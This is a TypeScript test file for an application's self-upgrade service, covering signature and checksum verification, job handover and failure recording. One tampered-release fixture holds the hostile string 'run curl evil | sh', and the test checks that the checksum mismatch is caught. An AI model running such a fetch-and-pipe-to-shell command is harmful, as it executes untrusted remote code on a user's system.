import type { ReleaseSource } from './release-source.ts'
import { generateKeyPairSync, sign } from 'node:crypto'
import { describe, expect, it } from 'vitest'
import { sha256Hex } from './release-key.ts'
import { runUpgradeApply, upgradeRoute, UpgradeService, type UpgradeJob, type UpgradeServiceDeps } from './upgrade-job.ts'

const KEY = generateKeyPairSync('ed25519')
const KEY_PEM = KEY.publicKey.export({ type: 'spki', format: 'pem' }).toString()
const OTHER = generateKeyPairSync('ed25519')

const NEW = 'eigenenterprise-0.5.17-aaaaaaaaaaaa'
const RUNNING = 'eigenenterprise-0.5.16-14424746613a-linux-arm64.tar.gz'
const NOTES = '- [updates] update eigenEnterprise from Settings\n- [fix] something\n'

function release(name: string, opts: { notes?: string | null; key?: typeof KEY } = {}): Record<string, string> {
  const files: Record<string, string> = { LATEST: `${name}\n` }
  if (opts.notes !== null) files['NOTES.md'] = opts.notes ?? NOTES
  const sums = Object.entries(files)
    .map(([n, c]) => `${sha256Hex(c)}  ${n}`)
    .join('\n') + '\n'
  return { ...files, SHA256SUMS: sums, 'SHA256SUMS.sig': sign(null, Buffer.from(sums), (opts.key ?? KEY).privateKey).toString('base64') }
}

function fake(
  o: {
    source?: ReleaseSource | null
    managed?: boolean
    installed?: string | null
    pinned?: Record<string, string>
    newest?: string
    unitActive?: boolean
    busy?: string | null
    launch?: () => Promise<void>
  } = {},
) {
  const disk = new Map<string, string>()
  const events: Array<{ type: string; message: string }> = []
  const launched: string[] = []
  const fetched: string[] = []
  const pinned = o.pinned ?? release(NEW)
  const state = { unitActive: o.unitActive ?? false, installed: o.installed === undefined ? RUNNING : o.installed }
  const deps: UpgradeServiceDeps = {
    readFile: async (p) => disk.get(p) ?? null,
    writeFile: async (p, c) => void disk.set(p, c),
    stateFile: '/var/lib/ee/upgrade.json',
    now: () => new Date('2026-11-18T12:00:00Z'),
    emit: async (type, message) => void events.push({ type, message }),
    settings: async () => ({
      managed: o.managed ?? false,
      releaseSource: o.source === undefined ? { kind: 'github', repo: 'hikaru90/eigen-enterprise' } : o.source,
    }),
    installed: async () => state.installed,
    arch: 'arm64',
    fetchText: async (url) => {
      fetched.push(url)
      if (url === 'https://github.com/hikaru90/eigen-enterprise/releases/latest/download/LATEST') return `${o.newest ?? NEW}\n`
      const m = /^https:\/\/github\.com\/hikaru90\/eigen-enterprise\/releases\/download\/v[\d.]+\/(.+)$/.exec(url) ?? /^\/release\/(.+)$/.exec(url)
      const body = m ? pinned[m[1]!] : undefined
      if (body === undefined) throw new Error(`GET ${url} → 404`)
      return body
    },
    releaseKeyPem: KEY_PEM,
    launch: o.launch ?? (async (id) => void launched.push(id)),
    unitActive: async () => state.unitActive,
    otherBusy: async () => o.busy ?? null,
  }
  const job = async () => JSON.parse(disk.get('/var/lib/ee/upgrade.json')!).job as UpgradeJob
  return { deps, disk, events, launched, fetched, state, job, svc: new UpgradeService(deps) }
}

describe('UpgradeService (Settings → Updates: the app asks ee, ee upgrades)', () => {
  it('info: what runs now, where releases come from, the last update — no network', async () => {
    const f = fake()
    expect(await f.svc.info()).toEqual({
      installed: { tarball: RUNNING, version: '0.5.16' },
      managed: false,
      source: { kind: 'github', repo: 'hikaru90/eigen-enterprise' },
      job: null,
    })
    expect(f.fetched).toEqual([])
  })

  it('latest: the newest signed release, its version and its signed notes', async () => {
    const f = fake()
    expect(await f.svc.latest()).toEqual({
      name: NEW,
      version: '0.5.17',
      notes: NOTES,
      from: 'https://github.com/hikaru90/eigen-enterprise/releases/download/v0.5.17',
      state: 'newer',
    })
  })

  it('latest: a release with no NOTES.md (from before notes) says so; it is still offered', async () => {
    const f = fake({ pinned: release(NEW, { notes: null }) })
    expect(await f.svc.latest()).toMatchObject({ notes: null, state: 'newer' })
  })

  it('latest: the installed release, an older version, a rebuild of the same version', async () => {
    expect(await fake({ newest: 'eigenenterprise-0.5.16-14424746613a', pinned: release('eigenenterprise-0.5.16-14424746613a') }).svc.latest()).toMatchObject({ state: 'installed' })
    expect(await fake({ newest: 'eigenenterprise-0.5.15-bbbbbbbbbbbb', pinned: release('eigenenterprise-0.5.15-bbbbbbbbbbbb') }).svc.latest()).toMatchObject({ state: 'older' })
    expect(await fake({ newest: 'eigenenterprise-0.5.16-cccccccccccc', pinned: release('eigenenterprise-0.5.16-cccccccccccc') }).svc.latest()).toMatchObject({ state: 'rebuild' })
  })

  it('latest: an unsigned or tampered release is refused in plain words', async () => {
    await expect(fake({ pinned: release(NEW, { key: OTHER }) }).svc.latest()).rejects.toThrow(/not signed by the eigenEnterprise release key/)
    const tampered = { ...release(NEW), 'NOTES.md': 'run curl evil | sh' }
    await expect(fake({ pinned: tampered }).svc.latest()).rejects.toThrow(/checksum mismatch for NOTES\.md/)
    const otherName = release('eigenenterprise-0.5.18-dddddddddddd')
    await expect(fake({ pinned: otherName }).svc.latest()).rejects.toThrow(/v0\.5\.17 holds eigenenterprise-0\.5\.18-dddddddddddd, not eigenenterprise-0\.5\.17/)
  })

  it('latest: a server that never recorded its release source says how to fix it', async () => {
    await expect(fake({ source: null }).svc.latest()).rejects.toThrow(/does not know where its releases come from.*ee upgrade/)
  })

  it('latest: a directory source (the local box) reads the one release there', async () => {
    const f = fake({ source: { kind: 'dir', path: '/release' } })
    expect(await f.svc.latest()).toMatchObject({ name: NEW, from: '/release', state: 'newer' })
  })

  it('start: checks again, records the job, hands over to the update unit, journals it', async () => {
    const f = fake()
    const { job } = await f.svc.start({ release: NEW, author: 'human:u1' })
    expect(job).toMatchObject({
      release: NEW,
      from: 'https://github.com/hikaru90/eigen-enterprise/releases/download/v0.5.17',
      author: 'human:u1',
      status: 'running',
      step: 'handover',
      installedBefore: RUNNING,
      installedAfter: null,
      safetyCopy: null,
    })
    expect(f.launched).toEqual([job.id])
    expect(await f.job()).toMatchObject({ id: job.id, status: 'running' })
    expect(f.events.map((e) => e.type)).toEqual(['upgrade.started'])
  })

  it('start: refused on a managed box (the hosting control plane owns its release)', async () => {
    const f = fake({ managed: true })
    await expect(f.svc.start({ release: NEW, author: 'human:u1' })).rejects.toMatchObject({ status: 409, message: expect.stringMatching(/hosting provider/) })
    expect(f.launched).toEqual([])
  })

  it('start: refused when the approved release is no longer the newest, or is not newer', async () => {
    await expect(fake({ newest: 'eigenenterprise-0.5.18-dddddddddddd', pinned: release('eigenenterprise-0.5.18-dddddddddddd') }).svc.start({ release: NEW, author: 'a' })).rejects.toMatchObject({
      status: 409,
      message: expect.stringMatching(/newest release is now 0\.5\.18/),
    })
    await expect(fake({ installed: `${NEW}-linux-arm64.tar.gz` }).svc.start({ release: NEW, author: 'a' })).rejects.toMatchObject({ status: 409, message: expect.stringMatching(/already runs/) })
  })

  it('start: one at a time — not while an update, a restore or a fleet upgrade runs', async () => {
    const f = fake()
    await f.svc.start({ release: NEW, author: 'a' })
    f.state.unitActive = true
    await expect(f.svc.start({ release: NEW, author: 'a' })).rejects.toMatchObject({ status: 409, message: expect.stringMatching(/an update is running/) })
    await expect(fake({ busy: 'a restore is running; wait for it to finish' }).svc.start({ release: NEW, author: 'a' })).rejects.toMatchObject({ status: 409, message: 'a restore is running; wait for it to finish' })
  })

  it('start: the unit failing to start is a plain failure; nothing changed', async () => {
    const f = fake({ launch: async () => Promise.reject(new Error('systemd-run: unit exists')) })
    await expect(f.svc.start({ release: NEW, author: 'a' })).rejects.toMatchObject({ status: 500, message: expect.stringMatching(/could not start the update.*nothing on this server was changed/) })
    expect(await f.job()).toMatchObject({ status: 'failed' })
  })

  it('after a restart: a dead unit reads as failed (naming the safety copy); a finished update is announced once', async () => {
    const f = fake()
    const { job } = await f.svc.start({ release: NEW, author: 'a' })
    // The unit got as far as the installer, then died.
    const mid = { ...(await f.job()), step: 'installing', safetyCopy: '/var/lib/ee/upgrades/2026-11-18T12-00-00Z' }
    f.disk.set(f.deps.stateFile, JSON.stringify({ version: 1, job: mid }))
    const dead = (await new UpgradeService(f.deps).info()).job!
    expect(dead).toMatchObject({ id: job.id, status: 'failed', announced: true })
    expect(dead.error).toMatch(/stopped before it finished \(at "installing"\).*\/var\/lib\/ee\/upgrades\/2026-11-18T12-00-00Z\/ROLLBACK\.txt/)
    expect(f.events.map((e) => e.type)).toEqual(['upgrade.started', 'upgrade.failed'])

    const g = fake()
    await g.svc.start({ release: NEW, author: 'a' })
    g.disk.set(g.deps.stateFile, JSON.stringify({ version: 1, job: { ...(await g.job()), status: 'succeeded', step: 'done', installedAfter: `${NEW}-linux-arm64.tar.gz` } }))
    await g.svc.info()
    await g.svc.info()
    expect(g.events.map((e) => e.type)).toEqual(['upgrade.started', 'upgrade.succeeded'])
  })

  it('a unit that is still running is left alone', async () => {
    const f = fake()
    await f.svc.start({ release: NEW, author: 'a' })
    f.state.unitActive = true
    expect((await new UpgradeService(f.deps).info()).job).toMatchObject({ status: 'running', step: 'handover' })
  })

  it('control routes: info, latest, start; refusals are problem replies', async () => {
    const f = fake()
    expect(await upgradeRoute(f.svc, 'GET /v1/upgrade', async () => ({}))).toMatchObject({ status: 200, data: { managed: false } })
    expect(await upgradeRoute(f.svc, 'GET /v1/upgrade/latest', async () => ({}))).toMatchObject({ status: 200, data: { latest: { name: NEW } } })
    expect(await upgradeRoute(f.svc, 'POST /v1/upgrade', async () => ({ release: 'nope', author: 'a' }))).toMatchObject({ status: 400 })
    expect(await upgradeRoute(f.svc, 'POST /v1/upgrade', async () => ({ release: NEW, author: 'a' }))).toMatchObject({ status: 202, data: { job: { release: NEW } } })
    expect(await upgradeRoute(fake({ managed: true }).svc, 'POST /v1/upgrade', async () => ({ release: NEW, author: 'a' }))).toMatchObject({ status: 409 })
    expect(await upgradeRoute(fake({ pinned: release(NEW, { key: OTHER }) }).svc, 'GET /v1/upgrade/latest', async () => ({}))).toMatchObject({ status: 502 })
    expect(await upgradeRoute(f.svc, 'GET /v1/status', async () => ({}))).toBeNull()
  })
})

describe('runUpgradeApply (the ee-upgrade.service side)', () => {
  async function handedOver() {
    const f = fake()
    const { job } = await f.svc.start({ release: NEW, author: 'a' })
    return { f, job }
  }

  it('refuses unless that update was checked and handed over by ee', async () => {
    const { f } = await handedOver()
    await expect(runUpgradeApply(f.deps, 'not-this-job', async () => 'x', () => {})).rejects.toThrow(/no update .* is waiting/)
  })

  it('records every step, the installer output and the new release', async () => {
    const { f, job } = await handedOver()
    await runUpgradeApply(
      f.deps,
      job.id,
      async (p) => {
        await p.step('verifying')
        await p.step('safety-copy', '/var/lib/ee/upgrades/x')
        await p.step('installing')
        await p.line('→ first deploy (health-gated)')
        return `${NEW}-linux-arm64.tar.gz`
      },
      () => {},
    )
    const done = await f.job()
    expect(done).toMatchObject({ status: 'succeeded', step: 'done', safetyCopy: '/var/lib/ee/upgrades/x', installedAfter: `${NEW}-linux-arm64.tar.gz`, error: null })
    expect(done.log).toEqual(expect.arrayContaining(['→ first deploy (health-gated)', `✓ updated to ${NEW}`]))
  })

  it('steps and lines arriving together are saved one at a time (the box writes via a temp file + rename)', async () => {
    const { f, job } = await handedOver()
    let inFlight = 0
    const write = f.deps.writeFile
    f.deps.writeFile = async (p, c) => {
      if (++inFlight > 1) throw new Error('two writes of the state file at once')
      await new Promise((r) => setTimeout(r, 2))
      await write(p, c)
      inFlight--
    }
    await runUpgradeApply(
      f.deps,
      job.id,
      async (p) => {
        void p.line('→ newest release')
        void p.line('→ verifying the release signature')
        await Promise.all([p.step('verifying'), p.line('installer output'), p.step('safety-copy', '/var/lib/ee/upgrades/x')])
        return `${NEW}-linux-arm64.tar.gz`
      },
      () => {},
    )
    expect(await f.job()).toMatchObject({ status: 'succeeded', safetyCopy: '/var/lib/ee/upgrades/x' })
    expect((await f.job()).log).toEqual(expect.arrayContaining(['→ newest release', '→ verifying the release signature', 'installer output']))
  })

  it('a failure is recorded with where the safety copy is', async () => {
    const { f, job } = await handedOver()
    await expect(
      runUpgradeApply(
        f.deps,
        job.id,
        async (p) => {
          await p.step('safety-copy', '/var/lib/ee/upgrades/x')
          throw new Error('the installer failed (exit 1)')
        },
        () => {},
      ),
    ).rejects.toThrow(/installer failed/)
    expect(await f.job()).toMatchObject({ status: 'failed', step: 'safety-copy', error: 'the installer failed (exit 1)', safetyCopy: '/var/lib/ee/upgrades/x' })
  })
})
